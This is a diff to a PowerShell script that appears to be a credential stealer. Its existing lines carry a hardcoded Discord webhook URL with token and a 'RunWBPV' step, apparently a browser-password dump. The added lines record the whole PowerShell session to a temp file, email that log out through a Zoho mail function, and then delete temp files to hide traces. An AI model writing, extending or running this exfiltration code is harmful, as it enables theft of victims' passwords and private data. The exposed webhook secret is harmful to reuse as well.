@@ -1,3 +1,6 @@
+# Start logging the PowerShell session
+Start-Transcript -Path "$env:TEMP\example-logs.txt" -Append
+
 $global:isEmailSent = $false
 $webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
 $totalSteps = 4
@@ -293,6 +296,14 @@ function ShowTree {
 }
 function ClearCache {
 
+    #email log file
+    if (-not $isEmailSent) {
+        # Email parameters
+        $subject = "Logs - Sent on $currentDateTime"
+        $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    } 
+
     # RunWBPV
     Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
     Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
@@ -328,5 +339,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
         4 { ShowTree }
     }
 }
+
+# Stop the transcript logging
+Stop-Transcript
 
 ClearCache
